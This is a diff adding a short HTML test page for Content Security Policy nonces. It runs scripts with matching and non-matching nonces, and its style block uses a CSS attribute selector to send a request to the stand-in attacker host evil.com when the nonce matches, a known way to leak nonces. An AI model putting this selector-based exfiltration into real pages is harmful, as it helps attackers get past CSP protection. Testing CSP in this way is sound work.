@@ -1,0 +1,33 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>测试Content Security Policy (CSP)</title>
+    <meta charset='utf-8'
+          http-equiv="Content-Security-Policy"
+          content="script-src 'self' 'nonce-wechat-authorize';" />
+
+</head>
+<body>
+
+<script type='text/javascript' nonce='wechat-authorize'>
+    console.log("xxx")
+</script>
+
+<script type='text/javascript' nonce='wechat-authorize1'>
+    console.log("xxx1")
+</script>
+
+<script type='text/javascript' nonce='wechat-authorize'>
+    console.log("xxx2")
+</script>
+
+</body>
+
+<style>
+    script[nonce~="wechat-authorize"] {
+        background: url("https://evil.com/nonce?whatever");
+    }
+</style>
+
+</html>
